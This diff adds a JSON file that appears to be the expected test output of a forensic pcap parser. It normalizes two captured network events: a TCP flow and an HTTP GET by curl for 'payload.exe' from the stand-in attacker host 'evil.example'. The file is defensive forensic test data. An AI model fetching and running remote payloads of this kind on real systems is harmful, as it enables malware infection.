@@ -1,0 +1,98 @@
+{
+ "assumptions": {
+  "flows": 1,
+  "format": "pcapng",
+  "linktype": 1,
+  "packets": 2,
+  "packets_in_dropped_flows": 0,
+  "timezone": "UTC (capture epoch)"
+ },
+ "counts": {
+  "errors": 0,
+  "events_emitted": 2,
+  "records_read": 2,
+  "skipped": 0
+ },
+ "error_samples": [],
+ "events": [
+  {
+   "action": "http_request",
+   "cmdline": null,
+   "dst_ip": "203.0.113.10",
+   "dst_port": 80,
+   "event_category": "network",
+   "event_code": "http_request",
+   "file_hash": null,
+   "file_path": null,
+   "host": null,
+   "id": "3189b7fd-1400-5102-b378-b6fb058b88fc",
+   "message": "HTTP GET http://evil.example/payload.exe",
+   "outcome": null,
+   "parser_name": "pcap",
+   "parser_version": "1.0.0",
+   "pid": null,
+   "ppid": null,
+   "process_name": null,
+   "protocol": "tcp",
+   "raw": {
+    "host": "evil.example",
+    "method": "GET",
+    "packet": 2,
+    "uri": "/payload.exe",
+    "user_agent": "curl/8.0"
+   },
+   "registry_key": null,
+   "source_file": "evidence/capture.pcapng",
+   "source_record_id": "pkt:2:http",
+   "source_type": "pcap",
+   "src_ip": "192.0.2.10",
+   "src_port": 49152,
+   "tags": [],
+   "ts": "2026-01-02T10:00:00.250000+00:00",
+   "ts_original": "pcap_ts:1767348000.25",
+   "user": null
+  },
+  {
+   "action": "connection",
+   "cmdline": null,
+   "dst_ip": "203.0.113.10",
+   "dst_port": 80,
+   "event_category": "network",
+   "event_code": "flow",
+   "file_hash": null,
+   "file_path": null,
+   "host": null,
+   "id": "54a9289d-710c-57e8-b29e-8fda73258176",
+   "message": "tcp 192.0.2.10:49152 -> 203.0.113.10:80 (2 packets, 179 bytes)",
+   "outcome": null,
+   "parser_name": "pcap",
+   "parser_version": "1.0.0",
+   "pid": null,
+   "ppid": null,
+   "process_name": null,
+   "protocol": "tcp",
+   "raw": {
+    "bytes": 179,
+    "duration_s": 0.25,
+    "packets": 2,
+    "tcp_flags": [
+     "ACK",
+     "SYN"
+    ]
+   },
+   "registry_key": null,
+   "source_file": "evidence/capture.pcapng",
+   "source_record_id": "flow:0",
+   "source_type": "pcap",
+   "src_ip": "192.0.2.10",
+   "src_port": 49152,
+   "tags": [],
+   "ts": "2026-01-02T10:00:00+00:00",
+   "ts_original": "pcap_ts:1767348000.0",
+   "user": null
+  }
+ ],
+ "parser": "pcap",
+ "parser_version": "1.0.0",
+ "warnings": {}
+}
